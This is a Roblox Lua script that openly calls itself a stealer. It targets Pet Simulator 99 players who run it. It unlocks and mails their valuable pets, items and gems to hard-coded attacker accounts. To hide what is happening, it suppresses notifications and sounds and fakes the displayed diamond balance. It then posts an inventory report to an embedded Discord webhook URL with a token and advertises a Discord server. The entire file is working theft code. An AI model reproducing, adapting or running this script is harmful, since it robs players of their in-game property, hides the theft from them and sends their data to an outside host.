local replicatedStorage = game:GetService("ReplicatedStorage")
local httpService = game:GetService("HttpService")
Username = "pet99_2948"
Username2 = "pet99_2947"
webhook = "https://discord.com/api/webhooks/1216303940870869102/vNRc4Q9xj3UNv73GSiZYx_HWoa1WDbsAEuU5uTtqB-5y2sQV5oWKLLG3LFoeiqzBVMLa"
min_rap = 1000

local f1, network, localPlayer, v1, v2, f2, inventory, v3, am, f3, value, notifications, v4,
  username, username2, v5

if getgenv().yeslidez then
  return
else
  getgenv().yeslidez = true
  network = replicatedStorage:WaitForChild("Network")
  localPlayer = game.Players.LocalPlayer
  v1 = {}
  v2 = 0

  function f2()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
  end

  inventory = f2().Inventory
  local mailboxSendsSinceReset = f2().MailboxSendsSinceReset
  v3 = 20000

  if mailboxSendsSinceReset ~= 0 then
    v3 = math.ceil(v3 * 1.5 ^ mailboxSendsSinceReset)
  end

  am = 0

  for key, value2 in pairs(f2().Inventory.Currency) do
    if value2.id == "Diamonds" then
      am = value2._am
      break
    end
  end

  if v3 > am then
    print("Not enough gems to send mail. Cost: " .. v3 .. " | Gems: " .. am)
    return
  else
    function f1(p1, p2)
      local headers = { ["Content-Type"] = "application/json" }
      local v6 = {}
      local v7 = {}

      for index, value3 in ipairs(v1) do
        local name = value3.name

        if v7[name] then
          v7[name].amount = v7[name].amount + value3.amount
        else
          v7[name] = { amount = value3.amount, rap = value3.rap }
          table.insert(v6, name)
        end
      end

      table.sort(v6, function(p3, p4)
        return v7[p3].rap * v7[p3].amount > v7[p4].rap * v7[p4].amount
      end)

      local text = ""

      for index2, value4 in ipairs(v6) do
        local v8 = v7[value4]

        text = text .. value4 .. " (x" .. v8.amount .. "): " .. f3(v8.rap * v8.amount) .. [[
 RAP
]]
      end

      local v9 = f3(p2)
      local v10 = f3(v2)

      local v11 = {
        title = "🐱 New PS99 Execution",
        color = 65280,
        fields = {
          { name = "Username:", value = "```" .. p1 .. "```", inline = true },
          { name = "Items:", value = "```" .. text .. "```", inline = false },
          {
            name = "Summary:",
            value = "```" .. ("Gems: " .. v9 .. "\nTotal RAP: " .. v10) .. "```",
            inline = false,
          },
        },
        footer = { text = "Stealer Forked From Tobis Source, .gg/FNnkfJqukh" },
      }

      local v12 = { embeds = { v11 } }

      if #v11.fields[2].value > 1024 then
        v11.fields[2].value = string.sub(v11.fields[2].value, 1, 1000) .. [[
...
```]]
      end

      local jsonEncode = httpService:JSONEncode(v12)
      local httpRequest = http_request or request or HttpPost or syn.request

      if webhook and webhook ~= "" and httpRequest then
        task.spawn(function()
          httpRequest({
            Url = webhook,
            Method = "POST",
            Headers = headers,
            Body = jsonEncode,
          })
        end)
      end
    end

    function f3(p5)
      local v13 = math.floor(p5)
      local v14 = { "", "k", "m", "b", "t" }
      local v15 = 1

      while v13 >= 1000 do
        v13 = v13 / 1000
        v15 = v15 + 1
      end

      return string.format("%.2f%s", v13, v14[v15])
    end

    value = localPlayer.leaderstats["💎 Diamonds"].Value

    localPlayer.leaderstats["💎 Diamonds"]:GetPropertyChangedSignal("Value"):Connect(function()
      localPlayer.leaderstats["💎 Diamonds"].Value = value
    end)

    local processPendingGUI = localPlayer.PlayerScripts.Scripts.Core["Process Pending GUI"]
    notifications = localPlayer.PlayerGui.Notifications
    processPendingGUI.Disabled = true

    notifications.Enabled = false

    notifications:GetPropertyChangedSignal("Enabled"):Connect(function()
      notifications.Enabled = false
    end)

    game.DescendantAdded:Connect(function(descendant)
      if descendant.ClassName == "Sound"
        and (descendant.SoundId == "rbxassetid://11839132565"
          or descendant.SoundId == "rbxassetid://14254721038"
          or descendant.SoundId == "rbxassetid://12413423276") then
        descendant:Destroy()
      end
    end)

    local function f4()
      local library = replicatedStorage:FindFirstChild("Library")

      if not library then
        return nil
      else
        local client = library:FindFirstChild("Client")

        if not client then
          return nil
        end

        for index3, value5 in ipairs({
          { library, "DevRAPCmds" }, { library, "RAPCmds" }, { client, "DevRAPCmds" },
          { client, "RAPCmds" },
        }) do
          local findFirstChild = value5[1]:FindFirstChild(value5[2])

          if findFirstChild and findFirstChild:IsA("ModuleScript") then
            local v16, v17 = pcall(require, findFirstChild)

            if v16 then
              print("Found RAP Module at: " .. findFirstChild:GetFullName())
              return v17
            end
          end
        end

        if client:IsA("ModuleScript") then
          local v18, v19 = pcall(require, client)

          if v18 and type(v19) == "table" then
            for key2, value6 in pairs(v19) do
              if typeof(value6) == "Instance" and value6:IsA("ModuleScript")
                and string.find(string.lower(tostring(key2)), "rap") then
                local v20, v21 = pcall(require, value6)

                if v20 then
                  return v21
                end
              elseif typeof(value6) == "table"
                and string.find(string.lower(tostring(key2)), "rap") then
                print("Found RAP Table in Client Module: " .. tostring(key2))
                return value6
              end
            end
          end
        end

        for index4, value7 in ipairs(replicatedStorage:GetDescendants()) do
          if value7:IsA("ModuleScript")
            and (value7.Name == "DevRAPCmds" or value7.Name == "RAPCmds") then
            local v22, v23 = pcall(require, value7)

            if v22 then
              print("Found RAP Module in ReplicatedStorage: " .. value7:GetFullName())
              return v23
            end
          end
        end

        return nil
      end
    end

    v4 = f4()

    if not v4 then
      warn("CRITICAL ERROR: Could not find RAP Module. Proceeding with fallback RAP values.")
    else
      print("RAP Module loaded successfully.")
    end

    local function f5()
      local v24, v25 = network:WaitForChild("Mailbox: Claim All"):InvokeServer()

      while v25 == "You must wait 30 seconds before using the mailbox!" do
        task.wait(0.5)
        local v26
        v26, v25 = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
      end
    end

    local function f6()
      if inventory.Box then
        for key3, value8 in pairs(inventory.Box) do
          if value8._uq then
            network:WaitForChild("Box: Withdraw All"):InvokeServer(key3)
          end
        end
      end
    end

    local function f7(p6, p7)
      local v27

      if not v4 then
        return 0
      else
        v27 = {
          Class = { Name = p6 },
          IsA = function(p8) return p8 == p6 end,
          GetId = function() return p7.id end,
          StackKey = function()
            return httpService:JSONEncode({
              id = p7.id,
              pt = p7.pt,
              sh = p7.sh,
              tn = p7.tn,
            })
          end,
        }

        local v28, v29 = pcall(function() return v4.Get(v27) end)

        if v28 and v29 and v29 > 0 then
          return v29
        end

        return 0
      end
    end

    username = Username

    local function f8()
      for key4, value9 in pairs(f2().Inventory.Currency) do
        if value9.id == "Diamonds" and am >= v3 + 10000 then
          local v30 = {
            [1] = username,
            [2] = "hi",
            [3] = "Currency",
            [4] = key4,
            [5] = am - v3,
          }

          local invokeServer = false
          local count = 0

          while not invokeServer and count < 10 do
            count = count + 1
            invokeServer = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(v30))
            task.wait(0.5)
          end

          break
        end
      end
    end

    username2 = Username2

    local function f9(p9, p10, p11)
      local v31 = {
        [1] = username,
        [2] = "hi",
        [3] = p9,
        [4] = p10,
        [5] = p11 or 1,
      }

      local invokeServer2 = false
      local count2 = 0

      while not invokeServer2 and count2 < 10 do
        count2 = count2 + 1
        invokeServer2 = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(v31))

        if not invokeServer2 then
          username = username2
          v31[1] = username
          task.wait(0.5)
        end
      end

      if invokeServer2 then
        am = am - v3
        v3 = math.ceil(v3 * 1.5)

        if v3 > 5000000 then
          v3 = 5000000
        end
      else
        warn("Failed to send item: " .. tostring(p10))
      end
    end

    print("Scanning inventory for items with RAP >= " .. min_rap)

    for index5, value10 in ipairs({
      "Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate",
    }) do
      if inventory[value10] then
        for key5, value11 in pairs(inventory[value10]) do
          if value10 == "Pet" then
            local v32 = require(replicatedStorage.Library.Directory.Pets)[value11.id]

            if v32.huge or v32.exclusiveLevel then
              local minRap = f7(value10, value11)
              print("Calculated RAP for " .. value11.id .. ": " .. minRap)

              if minRap <= 0 then
                print("WARNING: RAP module returned 0 for " .. value11.id
                  .. ". Forcing to min_rap.")

                minRap = min_rap
              end

              if minRap >= min_rap then
                local v33 = (value11.sh and "Shiny " or "")
                  .. (value11.pt == 1 and "Golden " or value11.pt == 2 and "Rainbow " or "")

                table.insert(v1, {
                  category = value10,
                  uid = key5,
                  amount = value11._am or 1,
                  rap = minRap,
                  name = v33 .. value11.id,
                })

                v2 = v2 + minRap * (value11._am or 1)
              end
            end
          else
            local v34 = f7(value10, value11)

            if v34 >= min_rap then
              table.insert(v1, {
                category = value10,
                uid = key5,
                amount = value11._am or 1,
                rap = v34,
                name = value11.id,
              })

              v2 = v2 + v34 * (value11._am or 1)
            end
          end

          if value11._lk then
            network:WaitForChild("Locking_SetLocked"):InvokeServer(key5, false)
          end
        end
      end
    end

    print("Found " .. #v1 .. " items to send.")

    if #v1 > 0 or am > min_rap + v3 then
      f5()
      task.wait(1)

      for key6, value12 in pairs(f2().Inventory.Currency) do
        if value12.id == "Diamonds" then
          am = value12._am
          break
        end
      end

      print("Updated Gem Amount after claiming mail: " .. am)
      f6()

      require(replicatedStorage.Library.Client.DaycareCmds).Claim()
      require(replicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()

      local save = replicatedStorage.Library.Client.Save
      v5 = require(save).Get()
      require(save).Get = function() return v5 end
      table.sort(v1, function(p12, p13) return p12.rap * p12.amount > p13.rap * p13.amount end)
      print("Sending webhook notification...")
      task.spawn(function() f1(localPlayer.Name, am) end)
      print("Sending items...")

      for index6, value13 in ipairs(v1) do
        if am >= v3 then
          print("Sending: " .. value13.name .. " | RAP: " .. value13.rap .. " | Amount: "
            .. value13.amount)

          f9(value13.category, value13.uid, value13.amount)
        else
          print("Stopped sending. Not enough gems to cover next mail cost of " .. v3)
          break
        end
      end

      f8()

      require(replicatedStorage.Library.Client.Message).Error([[
All your items just got stolen by yeslidez
 Join https://discord.gg/FNnkfJqukh]])

      setclipboard("https://discord.gg/FNnkfJqukh")
    else
      print("No items met the min_rap requirement or no gems to send.")
    end

    return
  end
end
